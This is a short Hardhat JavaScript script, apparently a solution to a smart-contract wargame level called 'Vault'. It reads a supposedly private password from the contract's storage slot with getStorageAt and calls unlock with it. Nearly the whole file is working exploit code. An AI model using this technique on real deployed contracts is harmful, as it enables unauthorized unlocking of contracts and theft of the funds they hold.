const hre = require("hardhat");

async function main() {
  // First get victim contract
  const Victim = await ethers.getContractFactory("Vault");
  const victim = await Victim.attach(
    "0x3450311C77d81b60B4D7873b8a8EF355b015C103" // This is the contract address that you get from starting your instance
  );

  // Check what is the value of the locked public variable
  const locked1 = await victim.locked();
  console.log("Lock variable locked is ", locked1);

  // We get the password since nothing is private in a blockchain
  const [owner, addr1] = await ethers.getSigners(); // get your account
  const password = await owner.provider.getStorageAt(victim.address, 1); // the variable desired is in the first slot
  console.log(
    `password = ${password} "${Buffer.from(password.slice(2), `hex`)}"` // Get the password in hex and letters
  );

  // Unlock the contract with the password
  const attack = await victim.unlock(password);

  await attack.wait(1);

  // Check what is the value of the locked public variable
  const locked2 = await victim.locked();
  console.log("Lock variable locked is ", locked2);
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
